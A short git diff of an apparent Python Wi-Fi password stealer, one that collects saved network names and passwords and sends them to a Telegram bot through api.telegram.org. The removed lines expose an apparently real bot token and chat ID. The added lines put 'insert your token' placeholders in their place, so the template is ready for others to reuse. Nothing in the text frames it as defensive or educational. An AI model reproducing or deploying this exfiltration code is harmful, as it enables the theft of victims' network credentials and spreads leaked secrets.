@@ -15,9 +15,8 @@ for name in profiles:
         data= f'WI-Fi name: {name} AND Password: be passworda balasha\n'
         results = f'{results}{data}'
 
-        
-requests.get(f'https://api.telegram.org/bot2012203094:AAHb8YbhAAdQPDORp6QQio1riNRtqw_c0P0/sendMessage?chat_id=1263068246&parse_mode=html&text={results}')
-# TOKEN = "2012203094:AAHb8YbhAAdQPDORp6QQio1riNRtqw_c0P0"
-# USER_ID = "1263068246"
+                                            #insert your token bot        #insert chat_id
+requests.get(f'https://api.telegram.org/bot<!token>/sendMessage?chat_id=<!chat id>6&parse_mode=html&text={results}')
+# TOKEN = "your token"
 # bot = nardn.Bot(token=TOKEN)
 # bot.send_message(chat_id=USER_ID, text=results)
